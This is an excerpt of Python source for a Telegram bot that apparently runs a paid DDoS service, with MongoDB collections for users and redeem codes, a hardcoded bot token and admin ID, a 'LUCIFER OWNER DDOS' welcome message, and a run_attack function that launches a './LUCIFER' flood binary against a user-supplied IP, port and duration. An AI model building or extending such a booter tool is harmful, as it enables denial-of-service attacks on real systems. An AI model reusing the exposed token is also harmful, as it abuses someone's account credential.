...
db = client['Kamisama']
users_collection = db['VIPDARK345']
settings_collection = db['settings0']  # A new collection to store global settings
redeem_codes_collection = db['redeem_codes0']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8029990244:AAEJ4KWF9yau3BnFtenhDp-KsLecFU33ml4'
ADMIN_USER_ID =  2073188376 # Replace with your admin user ID
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*🔥 Welcome to LUCIFER OWNER DDOS world 🔥*\n\n"
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./LUCIFER {ip} {port} {duration} 1000",
